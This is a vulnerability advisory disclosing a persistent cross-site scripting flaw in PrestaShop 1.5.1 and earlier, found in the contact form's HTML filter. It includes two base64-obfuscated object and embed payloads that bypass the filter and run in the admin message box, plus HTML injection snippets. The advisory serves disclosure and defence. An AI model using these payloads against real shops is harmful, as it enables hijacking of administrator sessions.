@@ -1,0 +1,85 @@
+PrestaShop <= 1.5.1 Persistent XSS
+
+Tested under: Firefox, Chrome and Safari latest versions
+Discover Credits: David Sopas - davidsopas@gmail.com | @dsopas |
+davidsopas.com/labs
+Original link: http://davidsopas.com/labs/prestashop_xss.txt
+
+Description:
+PrestaShop is the most reliable and flexible Open-source e-commerce
+software. Since 2007,
+PrestaShop has revolutionized the industry by providing features that
+engage shoppers and
+increase online sales. The Prestateam consists of over 100 passionate
+individuals and more
+than 350,000 community members dedicated to innovated technology.
+It has more than 2.000.000 downloads and won the best open-source
+e-commerce software in
+the last few years.
+
+When installing and analyzing PrestaShop on a secure environment I
+discovered that it's
+possible to bypass isCleanHtml() function, used in many places, in
+this case in particular
+the Contact Form.
+A user could use this vulnerability, a Persistent Cross-site
+Scripting, to execute malicious
+ payloads on admins message box.
+
+Proof of concept:
+In the message field a user could write:
+<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgid2Vic2VndXJhLm5ldC14c3MiKTwvc2NyaXB0
+Pg=='></object>
+
+or
+
+<embed src='data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc
+3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9y
+Zy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0
+ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIndlYnNlZ3VyYS5uZXQgeHNzIik7PC9zY3
+JpcHQ+PC9zdmc+' type='image/svg+xml' AllowScriptAccess='always'></embed>
+
+Both Base64 strings are mainly <script>alert()</script> encoded.
+
+Those XSS vectors bypass the filter on isCleanHtml() and execute
+automatically when the admin
+check the messages on the admin area. This is critical and could be
+used to implement very
+bad scenarios.
+
+Keep in mind that on some webmail variations, the code is also
+executed. A user can even play
+with heading <h1> and other HTML on message box.
+
+<a href="#" target="_blank"><img
+src="http://www.prestashop.com/images/logo.png" width="800px"
+ height="600px" border="0" /></a>
+
+or
+
+<a href="#" target="_blank" style="font-size: 30px">Click here</a>
+
+Again, encoding with Base64 could also obfuscate a little bit.
+
+I think that in this case in particular, HTML should be stripped out
+because it has no meaning
+in my opinion on the contact form.
+
+Solution: Vendor reported that upgrading PrestaShop to version 1.5.2
+will fix admins message
+box bug.
+HTML on email accounts still a possibility in the latest version.
+According to the vendor,
+it will be fixed on the next version.
+
+References:
+http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+http://ha.ckers.org/
+http://forge.prestashop.com/browse/PSCFV-5204
+
+
+--
+
+David Sopas
+davidsopas@gmail.com # @dsopas
